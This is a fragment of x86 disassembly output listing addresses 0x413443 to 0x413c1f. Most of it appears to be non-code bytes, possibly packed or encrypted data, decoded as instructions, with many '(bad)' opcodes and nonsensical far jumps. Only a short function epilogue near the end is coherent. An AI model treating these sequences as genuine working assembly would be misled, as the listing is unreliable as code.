  413443:	(bad)  
  413444:	stos   DWORD PTR es:[edi],eax
  413445:	xchg   esi,eax
  413446:	xchg   edx,eax
  413447:	adc    dl,cl
  413449:	loopne 0x413480
  41344b:	xlat   BYTE PTR ds:[ebx]
  41344c:	cmp    edx,DWORD PTR [eax]
  41344e:	jg     0x4133ff
  413450:	or     ecx,DWORD PTR [eax+0x6e]
  413453:	inc    esi
  413454:	loopne 0x413418
  413456:	sahf   
  413457:	xchg   esi,eax
  413458:	mov    ebx,0xdac9ce13
  41345d:	mov    BYTE PTR [ebx-0x65b8e2f7],al
  413463:	sub    BYTE PTR [eax-0x82f6710],ch
  413469:	pop    ds
  41346a:	adc    DWORD PTR [ebp+ebx*8+0x2c],esi
  41346e:	mov    edx,0x126472b5
  413473:	or     DWORD PTR [ebp-0x311235fc],eax
  413479:	ds push ss
  41347b:	mov    WORD PTR [ecx+0x61],?
  41347e:	aam    0xc8
  413480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413481:	icebp  
  413482:	sbb    ah,dl
  413484:	mov    ds:0x12a37164,eax
  413489:	add    al,cl
  41348b:	fisub  WORD PTR [edi]
  41348d:	movntps XMMWORD PTR [ecx],xmm5
  413490:	inc    ebx
  413491:	dec    edx
  413492:	aaa    
  413493:	out    dx,eax
  413494:	or     ebp,DWORD PTR ds:0x813893cd
  41349a:	lods   eax,DWORD PTR ds:[esi]
  41349b:	ins    DWORD PTR es:[edi],dx
  41349c:	cdq    
  41349d:	lahf   
  41349e:	jno    0x4134ed
  4134a0:	arpl   WORD PTR [ebx],si
  4134a2:	push   esi
  4134a3:	cdq    
  4134a4:	call   0xb8a4:0x842c9773
  4134ab:	out    0xca,eax
  4134ad:	or     bl,BYTE PTR [edi]
  4134af:	mov    cl,0xd7
  4134b1:	xchg   DWORD PTR [eax],esi
  4134b3:	jg     0x413440
  4134b5:	je     0x4134c0
  4134b7:	push   ebp
  4134b8:	sti    
  4134b9:	cwde   
  4134ba:	dec    edi
  4134bb:	and    al,0x53
  4134bd:	out    0xe2,eax
  4134bf:	outs   dx,BYTE PTR ds:[esi]
  4134c0:	aaa    
  4134c1:	jo     0x4134f4
  4134c3:	cmp    BYTE PTR [ebp-0x7df17302],cl
  4134c9:	js     0x413520
  4134cb:	lods   al,BYTE PTR ds:[esi]
  4134cc:	jmp    0x4134d3
  4134ce:	loope  0x4134a6
  4134d0:	push   ebx
  4134d1:	sub    ebp,DWORD PTR [ebx-0x14e82117]
  4134d7:	addr16 jb 0x413505
  4134da:	sahf   
  4134db:	in     al,0x42
  4134dd:	test   eax,0xcc9c6305
  4134e2:	and    ebp,DWORD PTR [ebp-0x2b4e19f]
  4134e8:	mov    ds:0x55abf42,al
  4134ed:	ficomp WORD PTR [edi-0x7c8492a8]
  4134f3:	jecxz  0x413556
  4134f5:	add    edi,ecx
  4134f7:	mov    ds:0x2db53b32,al
  4134fc:	dec    ebp
  4134fd:	aam    0x51
  4134ff:	pushf  
  413500:	xor    dl,ch
  413502:	mov    al,0xd0
  413504:	repz cmp al,0x89
  413507:	jmp    0x1464fb0c
  41350c:	fst    QWORD PTR [eax]
  41350e:	push   cs
  41350f:	mov    dh,0x7b
  413511:	push   edi
  413512:	shr    DWORD PTR [edi+0x6afbdab4],1
  413518:	fld    QWORD PTR [edi+0x3c11df34]
  41351e:	mov    esp,0x31006808
  413523:	adc    esp,ebp
  413525:	mov    ?,WORD PTR [ebx]
  413527:	out    0x5f,al
  413529:	aam    0x34
  41352b:	push   cs
  41352c:	popa   
  41352d:	out    0x63,al
  41352f:	cmp    DWORD PTR [edi+0x436012f3],ebx
  413535:	rol    cl,cl
  413537:	mov    ds:0x5144469,al
  41353c:	push   edi
  41353d:	push   0xffffffe9
  41353f:	stc    
  413540:	cli    
  413541:	push   0xdcef55a7
  413546:	(bad)  
  413547:	aaa    
  413548:	dec    edi
  413549:	push   es
  41354a:	mov    al,0xfb
  41354c:	inc    edi
  41354d:	js     0x4134d9
  41354f:	data16 test BYTE PTR [ecx-0x59],0x21
  413554:	fcom   QWORD PTR [ebp+0xd11ad6e]
  41355a:	adc    eax,0x406ff3fc
  41355f:	mov    edx,0x243c8fac
  413564:	scas   eax,DWORD PTR es:[edi]
  413565:	adc    dl,BYTE PTR [eax+edi*4-0x1dbf7b83]
  41356c:	repnz sub edx,DWORD PTR [esp+eiz*4]
  413570:	sub    DWORD PTR [edx+edx*2],0x6fa3409c
  413577:	mov    al,ds:0xbe884a3e
  41357c:	ds dec ebx
  41357e:	push   es
  41357f:	push   0xfae9f175
  413584:	in     al,0x24
  413586:	cld    
  413587:	loop   0x4135c9
  413589:	jmp    0xda93e854
  41358e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41358f:	sets   BYTE PTR [ebp+0x17e466d9]
  413596:	pop    esi
  413597:	in     al,dx
  413598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413599:	imul   edi,DWORD PTR [esi+edi*1+0x59],0x81525be7
  4135a1:	push   esi
  4135a2:	aad    0xfd
  4135a4:	ret    
  4135a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135a6:	ror    DWORD PTR [di-0x16],0xff
  4135ab:	add    bh,dh
  4135ad:	add    BYTE PTR [esi+0x336a8711],bl
  4135b3:	push   ds
  4135b4:	int    0x54
  4135b6:	xor    cl,bl
  4135b8:	mov    WORD PTR [edi],?
  4135ba:	push   0xffffff89
  4135bc:	add    eax,0xb10510e1
  4135c1:	add    BYTE PTR [ebx-0x6c6fe6b3],0x90
  4135c8:	adc    ch,bh
  4135ca:	sbb    eax,0x580de884
  4135cf:	fnstcw WORD PTR [edi-0xd63a971]
  4135d5:	(bad)  
  4135d6:	mov    dh,0x3f
  4135d8:	cdq    
  4135d9:	mov    ch,BYTE PTR [esi+0x1a3ed89f]
  4135df:	sub    DWORD PTR [edx-0x1e6cd980],eax
  4135e5:	fnstcw WORD PTR [ebx-0x4a]
  4135e8:	arpl   WORD PTR [ebx+0x1e7f4fa0],dx
  4135ee:	jns    0x41361b
  4135f0:	xchg   ecx,eax
  4135f1:	ja     0x413657
  4135f3:	scas   al,BYTE PTR es:[edi]
  4135f4:	mov    esp,0x80648824
  4135f9:	dec    ebp
  4135fa:	xchg   edx,eax
  4135fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135fc:	sbb    al,0x5a
  4135fe:	xchg   ecx,eax
  4135ff:	data16 and BYTE PTR [esi+0x3a652b3f],0xdd
  413607:	cmp    bl,BYTE PTR [ebx]
  413609:	lods   al,BYTE PTR ds:[esi]
  41360a:	(bad)  
  41360c:	push   es
  41360d:	inc    esi
  41360e:	push   eax
  41360f:	jno    0x41368f
  413611:	mov    edx,0xc4d382be
  413616:	push   cs
  413617:	aad    0x38
  413619:	cdq    
  41361a:	xchg   edx,eax
  41361b:	fidivr WORD PTR [ebx+0x2e48f23]
  413621:	push   edi
  413622:	in     eax,dx
  413623:	test   eax,0x663b7
  413628:	pushf  
  413629:	jl     0x41365f
  41362b:	adc    al,BYTE PTR [eax]
  41362d:	add    bh,BYTE PTR [eax+0x66d5575]
  413633:	iret   
  413634:	ins    DWORD PTR es:[edi],dx
  413635:	scas   eax,DWORD PTR es:[edi]
  413636:	dec    edi
  413637:	loop   0x413699
  413639:	std    
  41363a:	mov    cl,0xce
  41363c:	mov    al,0xbe
  41363e:	fs lock (bad) 
  413641:	int    0x2b
  413643:	ja     0x4135fa
  413645:	dec    edi
  413646:	mov    edx,0xf0209f8c
  41364b:	jnp    0x4136a4
  41364d:	mov    ebp,0xc5427bfe
  413652:	push   ss
  413653:	outs   dx,BYTE PTR ds:[esi]
  413654:	adc    ebx,0xaf57362b
  41365a:	sub    edx,edx
  41365c:	add    eax,0xcb85cf92
  413661:	push   0xffffffa2
  413663:	mov    edi,0xa3c2ab8e
  413668:	test   al,0x97
  41366a:	mov    ss,WORD PTR [eax]
  41366c:	jb     0x413681
  41366e:	mov    ch,0xca
  413670:	pop    ebx
  413671:	mov    ah,0x39
  413673:	lods   eax,DWORD PTR ds:[esi]
  413674:	mul    DWORD PTR [edx+esi*1-0x1345ac78]
  41367b:	hlt    
  41367c:	sub    esi,DWORD PTR [ebx+0xb07937f]
  413682:	add    BYTE PTR [esi-0x6b35419e],0xa5
  413689:	sbb    al,0xbd
  41368b:	cmp    eax,0x4e876063
  413690:	jne    0x4136fc
  413692:	outs   dx,DWORD PTR ds:[esi]
  413693:	or     eax,0xadf749d0
  413698:	adc    DWORD PTR [esi],ecx
  41369a:	and    dh,dl
  41369c:	and    ebp,DWORD PTR [esi-0x1de062de]
  4136a2:	into   
  4136a3:	xchg   ch,al
  4136a5:	jge    0x4136a5
  4136a7:	mov    eax,0x3c2f8bb2
  4136ac:	push   ss
  4136ad:	ins    BYTE PTR es:[edi],dx
  4136ae:	ins    DWORD PTR es:[edi],dx
  4136af:	js     0x16490ba5
  4136b5:	mov    cl,0xcd
  4136b7:	dec    edx
  4136b8:	lds    esp,FWORD PTR [ebp+0x38]
  4136bb:	adc    BYTE PTR [ebx-0x1c991be4],dh
  4136c1:	add    ebp,DWORD PTR [eax+eax*8+0x496cbaef]
  4136c8:	clc    
  4136c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136ca:	xor    eax,0x796e1f54
  4136cf:	xor    eax,0xa73003c
  4136d4:	xchg   esp,eax
  4136d5:	and    al,0x99
  4136d7:	cs loope 0x4136b0
  4136da:	mov    al,ds:0x24613cde
  4136df:	ins    DWORD PTR es:[edi],dx
  4136e0:	mov    al,ds:0xddedb3b5
  4136e5:	mov    al,0x2b
  4136e7:	push   ebx
  4136e8:	or     DWORD PTR [edi],0x60dfff22
  4136ee:	test   esi,0xf069fad2
  4136f4:	sahf   
  4136f5:	sub    al,0xf0
  4136f7:	xchg   ecx,eax
  4136f8:	or     ah,al
  4136fa:	repz sub eax,0xd4678cc
  413700:	sub    BYTE PTR [ecx],cl
  413702:	bound  esi,QWORD PTR [ecx-0x64]
  413705:	sub    dl,BYTE PTR [esi+ecx*8]
  413708:	cs push ebx
  41370a:	ret    
  41370b:	mov    ebp,0x8dab0e21
  413710:	stos   WORD PTR es:[edi],ax
  413712:	push   esp
  413713:	imul   esp,DWORD PTR [esi+eiz*8-0x6e],0xcacf343c
  41371b:	push   0xffffff8f
  41371d:	sar    al,1
  41371f:	data16 mov WORD PTR [esi],?
  413722:	jnp    0x413761
  413724:	inc    ebx
  413725:	cld    
  413726:	fwait
  413727:	xchg   ebp,eax
  413728:	fstp   QWORD PTR [ecx-0x6d17452a]
  41372e:	retf   
  41372f:	cmp    ah,BYTE PTR [ecx]
  413731:	std    
  413732:	lock xchg edi,eax
  413734:	aaa    
  413735:	xor    eax,0xc117a5a7
  41373a:	fisttp WORD PTR [edi]
  41373c:	xchg   esp,eax
  41373d:	cmp    al,al
  41373f:	mov    WORD PTR [edi-0x1e],es
  413742:	pop    edx
  413743:	mov    dh,0x25
  413745:	mov    ebp,DWORD PTR [eax]
  413747:	mov    BYTE PTR [ebx],0x6b
  41374a:	xor    BYTE PTR [esi+0x47],0x1
  41374e:	shr    BYTE PTR [esi],0xf3
  413751:	or     eax,0xd74493e6
  413756:	arpl   WORD PTR [ecx+0x20cc5f45],ax
  41375c:	and    DWORD PTR [ecx],esp
  41375e:	lock jne 0x4137b0
  413761:	and    ebp,ebx
  413763:	ss rcr BYTE PTR gs:[eax+0x59],1
  413768:	cmp    cl,ch
  41376a:	and    ch,ch
  41376c:	jae    0x41379f
  41376e:	and    eax,0x95dd3b74
  413773:	mov    WORD PTR [esi],ss
  413775:	(bad)  
  413776:	cmp    al,0x2d
  413778:	fcmove st,st(3)
  41377a:	xor    edx,eax
  41377c:	loope  0x4137dd
  41377e:	xor    BYTE PTR [ebp+0x58b1322b],bh
  413784:	mov    esi,DWORD PTR [ebp+0x12bf9180]
  41378a:	jmp    eax
  41378c:	shl    DWORD PTR [esi+0x67],0xa1
  413790:	inc    eax
  413791:	js     0x4137b4
  413793:	lea    edi,[esi-0x7486e2ce]
  413799:	sub    al,0x97
  41379b:	push   0x1b181d52
  4137a0:	sub    DWORD PTR [ebx],0x801d847c
  4137a6:	shl    ecx,0x6b
  4137a9:	ja     0x41382a
  4137ab:	out    0x96,al
  4137ad:	inc    ecx
  4137ae:	mov    BYTE PTR [edx+ebp*4+0x7e8d560d],dl
  4137b5:	lahf   
  4137b6:	cdq    
  4137b7:	and    esi,DWORD PTR [ebx-0x26]
  4137ba:	call   0xa3fc:0x61455029
  4137c1:	sbb    eax,0xaf9149e6
  4137c6:	push   0xffffff9a
  4137c8:	mov    ah,0xdc
  4137ca:	imul   ecx,DWORD PTR [esi+eax*1],0x6c
  4137ce:	retf   0xcd5f
  4137d1:	ja     0x41381c
  4137d3:	push   esp
  4137d4:	sbb    cl,bh
  4137d6:	test   BYTE PTR [esi],0xc4
  4137d9:	mov    ss:0xce4f328d,eax
  4137df:	outs   dx,BYTE PTR ds:[esi]
  4137e0:	xchg   esp,eax
  4137e1:	int3   
  4137e2:	pop    ss
  4137e3:	es aam 0xb6
  4137e6:	mov    eax,ds:0x49e9e019
  4137eb:	push   0x5406d396
  4137f0:	in     al,0x26
  4137f2:	fisubr DWORD PTR ds:0x43da2ed3
  4137f8:	xor    ebx,ebx
  4137fa:	repz dec edi
  4137fc:	jns    0x413849
  4137fe:	arpl   cx,dx
  413800:	leave  
  413801:	pop    es
  413802:	xlat   BYTE PTR ds:[ebx]
  413803:	fsub   st(5),st
  413805:	mov    al,0x83
  413807:	int3   
  413808:	sub    eax,0x9dc509d7
  41380d:	frstor [edi]
  41380f:	ss out dx,al
  413811:	scas   al,BYTE PTR es:[edi]
  413812:	stos   DWORD PTR es:[edi],eax
  413813:	cld    
  413814:	jne    0x41382c
  413816:	push   0xffffffc2
  413818:	loopne 0x413872
  41381a:	inc    edx
  41381b:	leave  
  41381c:	and    cl,ah
  41381e:	out    dx,al
  41381f:	jmp    0x41385e
  413821:	repnz mov edi,0x1080fdb3
  413827:	push   ecx
  413828:	icebp  
  413829:	jmp    DWORD PTR [edx]
  41382b:	adc    al,0x59
  41382d:	sbb    DWORD PTR [edx-0x27fe83],ebp
  413833:	adc    BYTE PTR ds:0x5639b690,cl
  413839:	fcmovnu st,st(6)
  41383b:	sahf   
  41383c:	cmp    BYTE PTR [ebx+edx*2-0x66],dh
  413840:	cmp    eax,0x76554312
  413845:	mov    ah,0x98
  413847:	mov    WORD PTR [eax+0x60],fs
  41384a:	xor    bh,BYTE PTR [edx+eax*2-0x4779140f]
  413851:	(bad)  
  413852:	shl    DWORD PTR ds:0x9fc96762,1
  413858:	mov    bl,0x14
  41385a:	retf   
  41385b:	mov    eax,0x6b4d582a
  413860:	push   eax
  413861:	fadd   DWORD PTR [ecx]
  413863:	fnsave ds:0xee11
  413868:	stos   BYTE PTR es:[edi],al
  413869:	call   0xb36d34bd
  41386e:	ins    BYTE PTR es:[edi],dx
  41386f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413870:	lds    ecx,FWORD PTR [ebp-0x4b1a6798]
  413876:	scas   al,BYTE PTR es:[edi]
  413877:	push   eax
  413878:	(bad)  
  413879:	out    dx,eax
  41387a:	mov    bl,0x5a
  41387c:	pusha  
  41387d:	pop    esi
  41387e:	stc    
  41387f:	lock mul BYTE PTR [edi+ebp*1+0x13]
  413884:	xchg   ebp,eax
  413885:	loop   0x413808
  413887:	xor    BYTE PTR [eax*1+0xc090cd],dl
  41388e:	daa    
  41388f:	stos   DWORD PTR es:[edi],eax
  413890:	mov    esp,0x29e2d44a
  413895:	cmp    eax,0x68c4c979
  41389a:	jns    0x413897
  41389c:	mov    esi,ss
  41389e:	aam    0x7f
  4138a0:	fdiv   DWORD PTR [eax+0x12]
  4138a3:	and    esi,DWORD PTR [esi+eax*1-0x71]
  4138a7:	retf   0xca52
  4138aa:	ins    DWORD PTR es:[edi],dx
  4138ab:	xchg   ecx,eax
  4138ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ad:	push   ebx
  4138ae:	cld    
  4138af:	mov    gs,WORD PTR [edi+0x7162a400]
  4138b5:	and    al,BYTE PTR [ebx-0x655ede0e]
  4138bb:	mov    dl,0x88
  4138bd:	ret    0x95b7
  4138c0:	daa    
  4138c1:	sti    
  4138c2:	jmp    0x41fb:0x51d00e8b
  4138c9:	adc    dh,BYTE PTR [esi]
  4138cb:	retf   0x6c0e
  4138ce:	and    eax,0xc69e10c8
  4138d3:	es jl  0x413881
  4138d6:	(bad)  
  4138d7:	sub    DWORD PTR [eax-0x5b603a1f],ebp
  4138dd:	sbb    BYTE PTR [edx+ecx*2+0x59],ah
  4138e1:	push   eax
  4138e2:	cld    
  4138e3:	xlat   BYTE PTR ds:[ebx]
  4138e4:	mov    esi,DWORD PTR ds:0xd258beb0
  4138ea:	je     0x41389f
  4138ec:	sbb    BYTE PTR [eax-0x5d8a0681],0xf1
  4138f3:	jnp    0x4138b9
  4138f5:	xchg   dl,cl
  4138f7:	mov    bl,BYTE PTR [eax-0x7b23c0c2]
  4138fd:	ins    BYTE PTR es:[edi],dx
  4138fe:	xor    eax,0x512d27cc
  413903:	xor    BYTE PTR [edx-0x7a01e7e8],bh
  413909:	or     BYTE PTR [ebx+0x245d5168],cl
  41390f:	ror    BYTE PTR [eax+ebp*8],1
  413912:	lods   eax,DWORD PTR ds:[esi]
  413913:	js     0x4138b6
  413915:	imul   edi,DWORD PTR [edx+0x32],0x7d480729
  41391c:	cmp    cl,BYTE PTR [eax+esi*8]
  41391f:	mov    al,0xcc
  413921:	les    ebx,FWORD PTR [eax*1+0x65c40dac]
  413928:	cmp    ebp,DWORD PTR [ebx]
  41392a:	mov    ebp,0x1c35ab5b
  41392f:	mul    DWORD PTR [ebx]
  413931:	das    
  413932:	inc    eax
  413933:	retf   
  413934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413935:	xor    BYTE PTR [ecx+0x2c073b7c],al
  41393b:	dec    ebp
  41393c:	mov    ds:0xad141343,eax
  413941:	cmp    DWORD PTR [eax+eax*4+0x35b92e72],edi
  413948:	stos   DWORD PTR es:[edi],eax
  413949:	adc    eax,0xfa10c902
  41394e:	mov    eax,DWORD PTR [ebp+eax*4+0x17]
  413952:	gs loopne 0x413992
  413955:	(bad)  
  413957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413958:	or     BYTE PTR [esi-0x5f],0xf1
  41395c:	fsubrp st(7),st
  41395e:	xchg   esp,eax
  41395f:	mov    ebx,0x1b86af56
  413964:	leave  
  413965:	addr16 xor eax,0xb9424215
  41396b:	ficomp DWORD PTR [esi+0x13]
  41396e:	inc    ecx
  41396f:	lods   al,BYTE PTR ds:[esi]
  413970:	or     DWORD PTR [edx],eax
  413972:	sbb    eax,0x9a76cd90
  413977:	cmp    eax,0xe7cbcff5
  41397c:	mov    ebx,0x44054ab9
  413981:	idiv   edi
  413983:	mov    al,0x96
  413985:	add    ch,0x45
  413988:	cs jnp 0x41395a
  41398b:	cwde   
  41398c:	xor    ebp,edx
  41398e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41398f:	out    dx,al
  413990:	mov    DWORD PTR [edi+0x3b],edi
  413993:	sbb    eax,0x61a5e1c4
  413998:	int    0x9d
  41399a:	pusha  
  41399b:	(bad)  
  41399c:	pop    edi
  41399d:	ret    0x9967
  4139a0:	sbb    DWORD PTR [ebx+0x41],esp
  4139a3:	jecxz  0x413967
  4139a5:	retf   0x3316
  4139a8:	xor    DWORD PTR ds:0x7be36cef,eax
  4139ae:	xchg   ecx,eax
  4139af:	sti    
  4139b0:	pop    ebx
  4139b1:	mov    esp,0x13a6208f
  4139b6:	add    dh,dl
  4139b8:	iret   
  4139b9:	ror    esp,0x6
  4139bc:	cdq    
  4139bd:	bndldx (bad),[ebx-0x63]
  4139c1:	mov    eax,ds:0xdd899487
  4139c6:	jno    0x4139a3
  4139c8:	adc    BYTE PTR [eax*1-0x55d30ce0],cl
  4139cf:	sub    DWORD PTR ds:0x6c675925,esi
  4139d5:	inc    ecx
  4139d6:	cdq    
  4139d7:	push   es
  4139d8:	iret   
  4139d9:	rcr    DWORD PTR [ebp+0x58],cl
  4139dc:	pop    eax
  4139dd:	xchg   esp,eax
  4139de:	lods   eax,DWORD PTR ds:[esi]
  4139df:	sar    DWORD PTR [esi],1
  4139e1:	dec    ecx
  4139e2:	mov    ch,0x51
  4139e4:	mov    ds:0x8d235965,al
  4139e9:	or     al,0x2b
  4139eb:	or     ebp,eax
  4139ed:	jg     0x413a63
  4139ef:	jg     0x413994
  4139f1:	popa   
  4139f2:	out    0xd9,al
  4139f4:	popa   
  4139f5:	cmp    bh,ch
  4139f7:	dec    edi
  4139f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f9:	mov    edi,0xab6ad8e0
  4139fe:	jo     0x4139ac
  413a00:	dec    ebx
  413a01:	pop    ebx
  413a02:	xor    edi,DWORD PTR [esp+ebx*2]
  413a05:	scas   eax,DWORD PTR es:[edi]
  413a06:	inc    DWORD PTR [edi+0x0]
  413a09:	add    eax,0xa71675f1
  413a0e:	and    esi,DWORD PTR [eax-0x3]
  413a11:	mov    esi,0x85f861d7
  413a16:	add    cl,BYTE PTR [eax+ebp*8-0x66975c9]
  413a1d:	xchg   ecx,eax
  413a1e:	cmp    al,0x7d
  413a20:	jbe    0x413a78
  413a22:	or     bl,BYTE PTR [ecx+esi*4-0x5]
  413a26:	icebp  
  413a27:	xchg   eax,ebp
  413a29:	(bad)  
  413a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a2b:	js     0x413a2e
  413a2d:	mov    ah,0xd5
  413a2f:	xlat   BYTE PTR ds:[ebx]
  413a30:	gs jl  0x413a6d
  413a33:	out    0x3c,al
  413a35:	fdivr  st(5),st
  413a37:	push   esi
  413a38:	xor    ebp,0xf
  413a3b:	(bad)  
  413a3c:	or     DWORD PTR [edx],edi
  413a3e:	sahf   
  413a3f:	add    al,0xb3
  413a41:	int    0xc2
  413a43:	jmp    0xb2e9:0xb64ff002
  413a4a:	or     DWORD PTR gs:[eax+0x1f],esi
  413a4e:	(bad)  
  413a4f:	test   al,0x2b
  413a51:	xchg   edi,eax
  413a52:	(bad)  
  413a53:	sub    DWORD PTR [esi+ecx*1],edi
  413a56:	pop    es
  413a57:	stos   DWORD PTR es:[edi],eax
  413a58:	add    esi,DWORD PTR [ebx]
  413a5a:	mov    eax,ds:0x69c5d96e
  413a5f:	aaa    
  413a60:	sahf   
  413a61:	(bad)  [eax+0x7f4fb4d2]
  413a67:	fmul   st,st(3)
  413a69:	sbb    ch,cl
  413a6b:	jle    0x413a25
  413a6d:	mov    ah,0xe2
  413a6f:	adc    ebp,esp
  413a71:	rol    BYTE PTR [edi],0x27
  413a74:	mov    edi,0x6d98d6c8
  413a79:	sub    DWORD PTR [ebx+0x1f6b646a],eax
  413a7f:	retf   0x3148
  413a82:	mov    ch,0xbd
  413a84:	dec    ecx
  413a85:	jmp    0x413a28
  413a87:	addr16 inc ebx
  413a89:	ins    DWORD PTR es:[edi],dx
  413a8a:	and    eax,ebp
  413a8c:	cmp    DWORD PTR [esi],esp
  413a8e:	(bad)  
  413a8f:	leave  
  413a90:	lods   al,BYTE PTR ds:[esi]
  413a91:	mov    BYTE PTR [edi],bl
  413a93:	jle    0x413a5f
  413a95:	pop    esi
  413a96:	xor    esi,DWORD PTR [ecx]
  413a98:	js     0x413b13
  413a9a:	cmc    
  413a9b:	scas   al,BYTE PTR es:[edi]
  413a9c:	dec    ebx
  413a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9e:	mov    ebx,DWORD PTR [esi-0x39702de7]
  413aa4:	push   eax
  413aa5:	jecxz  0x413ad6
  413aa7:	not    BYTE PTR [edi+0x5261577f]
  413aad:	ret    
  413aae:	sbb    edi,DWORD PTR [edx+0x12]
  413ab1:	push   edx
  413ab2:	dec    edi
  413ab3:	cmp    bh,BYTE PTR [edi+0x6e]
  413ab6:	adc    dh,ah
  413ab8:	mov    dl,0xf2
  413aba:	es pushf 
  413abc:	je     0x413b24
  413abe:	div    BYTE PTR ds:0x205ba93a
  413ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ac5:	pop    edx
  413ac6:	aaa    
  413ac7:	sub    esi,DWORD PTR [edx+0x66]
  413aca:	mov    ebx,0x86482d1e
  413acf:	lods   al,BYTE PTR ds:[esi]
  413ad0:	fiadd  WORD PTR [ebp+0x27]
  413ad3:	xor    DWORD PTR [eax-0xc0f3008],edi
  413ad9:	(bad)  
  413ada:	push   esp
  413adb:	push   ecx
  413adc:	rcr    cl,0x1e
  413adf:	sub    al,0xa3
  413ae1:	inc    edi
  413ae2:	add    DWORD PTR [ebx],eax
  413ae4:	cmc    
  413ae5:	fst    QWORD PTR ds:0x4097ff26
  413aeb:	mov    ebp,0x4250716a
  413af0:	rcr    DWORD PTR [esi+0x17],0xb6
  413af4:	call   0xa0b77887
  413af9:	push   edi
  413afa:	test   al,0x6a
  413afc:	cmp    dl,BYTE PTR [ebx-0x58]
  413aff:	add    BYTE PTR [ebx+ebp*4+0x40],bl
  413b03:	cdq    
  413b04:	repz adc esi,DWORD PTR [ecx-0x31]
  413b08:	fidiv  DWORD PTR [esi+0x47]
  413b0b:	lock pop edi
  413b0d:	sbb    eax,0xefccddbd
  413b12:	lahf   
  413b13:	dec    ebx
  413b14:	sbb    al,dl
  413b16:	(bad)  
  413b17:	out    dx,eax
  413b18:	jno    0x413ade
  413b1a:	adc    BYTE PTR [ecx],ch
  413b1c:	or     bl,bh
  413b1e:	push   ecx
  413b1f:	test   eax,0xf57e9730
  413b24:	in     al,0xaf
  413b26:	push   edx
  413b27:	cmp    eax,0x40763c2f
  413b2c:	mov    ecx,0x6ef67c4c
  413b31:	lods   al,BYTE PTR ds:[esi]
  413b32:	cld    
  413b33:	jns    0x413ae8
  413b35:	push   eax
  413b36:	or     DWORD PTR [eax+0x1de09581],edx
  413b3c:	mov    ebp,0x7d9b1b77
  413b41:	push   cs
  413b42:	mov    ah,0x6a
  413b44:	pop    ecx
  413b45:	pop    ecx
  413b46:	nop
  413b47:	adc    BYTE PTR [edi-0x26],0x72
  413b4b:	push   ebx
  413b4c:	sahf   
  413b4d:	daa    
  413b4e:	cdq    
  413b4f:	int3   
  413b50:	dec    edi
  413b51:	ret    0x42f6
  413b54:	arpl   WORD PTR ds:0x34db1bf5,di
  413b5a:	lods   al,BYTE PTR ds:[esi]
  413b5b:	pop    ss
  413b5c:	aad    0x6c
  413b5e:	push   cs
  413b5f:	aaa    
  413b60:	or     eax,0x2a6ab70e
  413b65:	aas    
  413b66:	gs inc esp
  413b68:	add    eax,0xeecabda4
  413b6d:	push   0x3e
  413b6f:	aam    0xc8
  413b71:	es mov dh,0x3d
  413b74:	je     0x413bd5
  413b76:	fst    QWORD PTR [ecx+0x2d]
  413b79:	jnp    0x413bcc
  413b7b:	mov    edi,0x711fbdc5
  413b80:	rcl    DWORD PTR [edi-0x113ad26],cl
  413b86:	stc    
  413b87:	mov    dh,0x6d
  413b89:	jp     0x413b74
  413b8b:	sbb    al,0x2
  413b8d:	into   
  413b8e:	push   edx
  413b8f:	ja     0x413be5
  413b91:	shl    DWORD PTR [eax+0x1fff28a8],cl
  413b97:	stos   DWORD PTR es:[edi],eax
  413b98:	sub    bl,BYTE PTR [eax+0x55]
  413b9b:	call   0x29d1051b
  413ba0:	cmp    eax,0x528db522
  413ba5:	arpl   bx,si
  413ba7:	pop    ecx
  413ba8:	push   0x3786bc65
  413bad:	jb     0x413bec
  413baf:	(bad)  
  413bb0:	mov    al,BYTE PTR [ecx+eiz*8]
  413bb3:	xor    DWORD PTR [edi+0x47],ecx
  413bb6:	push   esp
  413bb7:	or     BYTE PTR [esi-0x38],dl
  413bba:	mov    bl,al
  413bbc:	mov    bl,0xf1
  413bbe:	cbw    
  413bc0:	js     0x413c17
  413bc2:	loopne 0x413bed
  413bc4:	inc    ecx
  413bc5:	mov    al,0x1c
  413bc7:	inc    edi
  413bc8:	add    BYTE PTR [ebp+0x305faa63],al
  413bce:	aam    0x59
  413bd0:	repz stc 
  413bd2:	jne    0x413b80
  413bd4:	and    BYTE PTR [edx+0x6],ah
  413bd7:	mov    ds:0xaed5190a,eax
  413bdc:	xchg   edi,eax
  413bdd:	rcl    BYTE PTR [ecx+eiz*8],cl
  413be0:	fwait
  413be1:	cld    
  413be2:	cli    
  413be3:	mov    ecx,DWORD PTR [ebp-0x8]
  413be6:	xor    ecx,eax
  413be8:	mov    eax,DWORD PTR [ebp+0x10]
  413beb:	add    ecx,esi
  413bed:	mov    DWORD PTR [eax],ecx
  413bef:	pop    edi
  413bf0:	pop    esi
  413bf1:	pop    ebx
  413bf2:	leave  
  413bf3:	ret    0xc
  413bf6:	jne    0x413c0b
  413bf8:	adc    BYTE PTR [eax],al
  413bfa:	std    
  413bfb:	push   ds
  413bfc:	adc    BYTE PTR [eax],al
  413bfe:	aas    
  413bff:	adc    BYTE PTR fs:[eax],al
  413c02:	sbb    cl,BYTE PTR [esi]
  413c04:	adc    BYTE PTR [eax],al
  413c06:	sbb    BYTE PTR [eax+0x10],dl
  413c09:	add    BYTE PTR [eax],ah
  413c0b:	push   es
  413c0c:	adc    BYTE PTR [eax],al
  413c0e:	out    dx,al
  413c0f:	jg     0x413c21
  413c11:	add    BYTE PTR [ebx],al
  413c13:	dec    edi
  413c14:	adc    BYTE PTR [eax],al
  413c16:	mov    esp,0x5500103b
  413c1b:	jns    0x413c2d
  413c1d:	add    BYTE PTR [edx],ch
  413c1f:	inc    eax
